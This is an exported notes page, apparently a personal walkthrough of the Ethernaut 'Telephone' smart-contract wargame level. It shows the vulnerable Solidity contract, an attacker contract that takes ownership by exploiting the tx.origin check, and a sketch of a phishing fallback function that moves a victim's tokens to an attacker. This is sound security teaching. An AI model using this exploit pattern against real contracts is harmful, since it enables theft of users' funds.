---
title: "Telephone"
date: "2024-01-16"
lastmod: "2024-02-14T16:51:00.000Z"
draft: false
difficulty: "⭐"
prev: "Coin-Flip-c27578d40d2f427d968d5623d7000dab"
weight: 5
state: "Terminé"
level-url: "https://ethernaut.openzeppelin.com/level/4"
next: "Token-4a8cb8765f8c412190f2db4a7989f9b5"
type: "docs"
NOTION_METADATA:
  object: "page"
  id: "8b2069f0-beb0-45b6-9400-a28665c1d56c"
  created_time: "2024-02-12T13:39:00.000Z"
  last_edited_time: "2024-02-14T16:51:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "external"
    external:
      url: "https://ethernaut.openzeppelin.com/imgs/BigLevel4.svg"
  parent:
    type: "database_id"
    database_id: "cb6853ff-d731-4d6a-9080-6c8efeec5b1c"
  archived: false
  properties:
    difficulty:
      id: "IAjo"
      type: "select"
      select:
        id: "FPYQ"
        name: "⭐"
        color: "gray"
    prev:
      id: "LLP%5C"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Coin-Flip-c27578d40d2f427d968d5623d7000dab"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Coin-Flip-c27578d40d2f427d968d5623d7000dab"
          href: null
    date:
      id: "Y%40Gy"
      type: "date"
      date:
        start: "2024-01-16"
        end: null
        time_zone: null
    weight:
      id: "%5Dyda"
      type: "number"
      number: 5
    state:
      id: "f%40ps"
      type: "status"
      status:
        id: "abb7fad3-add1-4b13-946c-06bff36598bf"
        name: "Terminé"
        color: "green"
    level-url:
      id: "juZs"
      type: "url"
      url: "https://ethernaut.openzeppelin.com/level/4"
    next:
      id: "pocA"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Token-4a8cb8765f8c412190f2db4a7989f9b5"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Token-4a8cb8765f8c412190f2db4a7989f9b5"
          href: null
    type:
      id: "s%7DKc"
      type: "select"
      select:
        id: "OnJy"
        name: "docs"
        color: "default"
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Telephone"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Telephone"
          href: null
  url: "https://www.notion.so/Telephone-8b2069f0beb045b69400a28665c1d56c"
  public_url: null
UPDATE_TIME: "2024-02-23T22:51:04.985Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


Claim ownership of the contract below to complete this level.


Things that might help

- See the ["?"](https://ethernaut.openzeppelin.com/help) page above, section "Beyond the console"

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```


This is one is pretty straight forward, here is the attacker contract we can deploy:


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
  function changeOwner(address _owner) external;
}

contract CoinFlipAttack {

   Telephone telephone;

  constructor(address target) {
    telephone = Telephone(target);
  }

  function attack() public {
    telephone.changeOwner(msg.sender);
  }
}
```


While this example may be simple, confusing `tx.origin` with `msg.sender` can lead to phishing-style attacks, such as [this](https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/).


An example of a possible attack is outlined below.

1. Use `tx.origin` to determine whose tokens to transfer, e.g.

```text
function transfer(address _to, uint _value) {
  tokens[tx.origin] -= _value;
  tokens[_to] += _value;
}

```

1. Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.

```text
function () payable {
  token.transfer(attackerAddress, 10000);
}

```

1. In this scenario, `tx.origin` will be the victim's address (while `msg.sender` will be the malicious contract's address), resulting in the funds being transferred from the victim to the attacker.
